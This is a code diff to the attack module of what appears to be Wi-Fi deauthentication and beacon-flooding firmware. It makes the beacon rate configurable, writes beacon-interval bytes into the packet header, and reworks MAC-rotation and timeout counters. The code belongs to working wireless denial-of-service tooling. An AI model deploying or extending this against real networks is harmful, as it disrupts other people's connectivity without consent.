@@ -17,6 +17,8 @@ void Attack::generate() {
     for (int i = 0; i < 6; i++) _randomBeaconMac.setAt(_randomMacBuffer[i], i);
   } while (beaconAdrs.add(_randomBeaconMac) >= 0);
   if (debug) Serial.println("done");
+
+  macListChangeCounter = 0;
 }
 
 void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason) {
@@ -46,6 +48,11 @@ void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt) {
   for (int i = 0; i < sizeof(beaconPacket_header); i++) {
     packet[i] = beaconPacket_header[i];
     packetSize++;
+  }
+
+  if(settings.beaconInterval){
+    beaconPacket_header[32] = 0xe8;
+    beaconPacket_header[33] = 0x03;
   }
 
   for (int i = 0; i < 6; i++) {
@@ -185,8 +192,10 @@ void Attack::run() {
     }
   }
 
-  /* =============== Beacon list Attack =============== */
-  if (isRunning[1] && currentMillis - prevTime[1] >= 100) {
+  /* =============== Beacon Attack =============== */
+  int beaconsPerSecond = 10;
+  if(settings.beaconInterval) beaconsPerSecond = 1;
+  if (isRunning[1] && currentMillis - prevTime[1] >= 1000/beaconsPerSecond) {
     if (debug) Serial.print("running " + (String)attackNames[1] + " attack...");
     prevTime[1] = millis();
 
@@ -199,17 +208,18 @@ void Attack::run() {
       if (send()) packetsCounter[1]++;
     }
 
-    stati[1] = (String)(packetsCounter[1] * 10) + "pkts/s";
+    stati[1] = (String)(packetsCounter[1] * beaconsPerSecond) + "pkts/s";
     packetsCounter[1] = 0;
+    
     macListChangeCounter++;
-    if (macListChangeCounter / 10 >= macChangeInterval && macChangeInterval > 0) {
-      generate();
-      macListChangeCounter = 0;
+    if(settings.macInterval > 0){
+      if (macListChangeCounter / beaconsPerSecond >= settings.macInterval) generate();
     }
+    
     if (debug) Serial.println(" done");
     if (settings.attackTimeout > 0) {
       attackTimeoutCounter[1]++;
-      if (attackTimeoutCounter[1] / 10 > settings.attackTimeout) stop(1);
+      if (attackTimeoutCounter[1] / beaconsPerSecond > settings.attackTimeout) stop(1);
     }
   }
 
@@ -226,13 +236,15 @@ void Attack::run() {
 
     stati[2] = (String)(packetsCounter[2]) + "pkts/s";
     packetsCounter[2] = 0;
+
     macListChangeCounter++;
-    if (macListChangeCounter >= macChangeInterval && macChangeInterval > 0) {
-      generate();
+    if(settings.macInterval > 0){
+      if (macListChangeCounter >= settings.macInterval) generate();
       /*ssidList.clear();
       ssidList._random();
       macListChangeCounter = 0;*/
     }
+    
     if (debug) Serial.println("done");
     if (settings.attackTimeout > 0) {
       attackTimeoutCounter[2]++;
@@ -269,6 +281,7 @@ void Attack::stop(int num) {
     prevTime[num] = millis();
     refreshLed();
   }
+  
   stati[num] = "ready";
 }
 
